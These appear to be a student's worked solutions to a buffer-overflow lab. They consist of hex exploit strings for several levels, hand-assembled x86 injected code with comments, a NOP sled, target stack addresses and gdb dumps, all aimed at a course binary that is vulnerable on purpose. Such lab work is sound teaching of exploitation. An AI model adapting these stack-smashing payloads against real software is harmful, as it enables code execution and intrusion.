61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 7b 96 04 08
61 61 61 61 63 0d bb 15


0x55682f9c
cookie: 0x15bb0d63


68 7b 96 04 08		/* push bang addr */
bb 63 0c bb 15		/* mov $0x15bb0c63, ebx */
81 c3 00 01 00 00		/* add    $0x100,%ebx */
89 1d 48 e1 04 08		/* mov $ebx, 0x804e148 */
C3			/* ret  */


68 7b 96 04 08 bb 63 0c
bb 15 81 c3 00 01 00 00
89 1d 48 e1 04 08 C3 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 68 2F 68 55

global_var addr: 0x148+0x804e000=0x804e148


<<level 3>>

0x08049711: in test, after calling getbuf
0x55682fa0: uniqueval saved in stack
0x55682fa4: val
0x804e110: cookie addr

68 11 97 04 08				/* push test middle addr: 0x08049711 */
8b 04 25 10 e1 04 08	/* mov 0x804e110, eax */
bd b0 2f 68 55				/* mov $0x55682fb0, ebp */
bb 00 e0 04 08				/* mov $0x804e000, ebx */
c3										/* ret */

68 11 97 04 08 8b 04 25
10 e1 04 08 bd b0 2f 68
55 bb 00 e0 04 08 c3 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 68 2F 68 55


<<level 4>>

0x55682fb4: esp of 1st testn enter
0x55682f64: esp of 2nd testn enter
0x55682f84: esp of 3rd testn enter
0x55682f44: esp of 4th testn enter
0x55682f54: esp of 5th testn enter

8d 00									/* lea 0x0(eax), eax */

68 a3 97 04 08				/* push test middle addr: 0x080497a3 */
a1 10 e1 04 08				/* mov 0x804e110, eax */
8d 6c 24 1c						/* lea 0x1c(esp), ebp */
bb 00 e0 04 08				/* mov $0x804e000, ebx */
c3										/* ret */

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x020 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x040 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90		/* 0x060 */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 68 a3 97 04 08 a1 10 e1 04 08 8d 6c 24 1c bb 00		/* 0x080 */
e0 04 08 c3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x0a0 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x0c0 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x0e0 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x100 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x120 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x140 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x160 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x180 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x1a0 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x1c0 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x1e0 */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61		/* 0x200 */
61 61 61 61 61 61 61 61 61 61 61 61 88 2d 68 55 																									/* 0x210 */


<<level 5>>

0x0804c148: HOLYMOLY string addr

bc 64 2f 68 55        /* mov $0x55682f64, esp */
68 55 98 04 08        /* push testr middle addr: 0x8049855 */
83 ec 0c              /* sub $0xc, esp */
68 20 e1 04 08        /* push $0x804e120 */
b8 70 93 04 08        /* mov $0x08049370, eax */
ff d0                 /* call eax */
83 c4 10              /* add $0x10, esp */
b8 22 00 00 00        /* mov $0x22, eax */
c3                    /* ret */

bc 64 2f 68 55 68 55 98
04 08 83 ec 0c 68 20 e1
04 08 b8 70 93 04 08 ff
d0 83 c4 10 b8 22 00 00
00 c3 61 61 61 61 61 61
b0 2f 68 55 68 2F 68 55
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61

0x04985568      0x2fb0bd08      0x8cbb5568      0x8355682f
0x20680cec      0xb80804e1      0x08049370      0xc483d0ff
0x0022b810      0x61c30000      0x61616161      0x55682f68

0x55682f68 <_reserved+1036136>: 0x04985568      0x2fb0bd08      0x8cbb5568      0x8355682f
0x55682f78 <_reserved+1036152>: 0x20680cec      0xb80804e1      0x08049370      0xc483d0ff
0x55682f88 <_reserved+1036168>: 0x0022b810      0x61c30000      0x61616161      0x08049855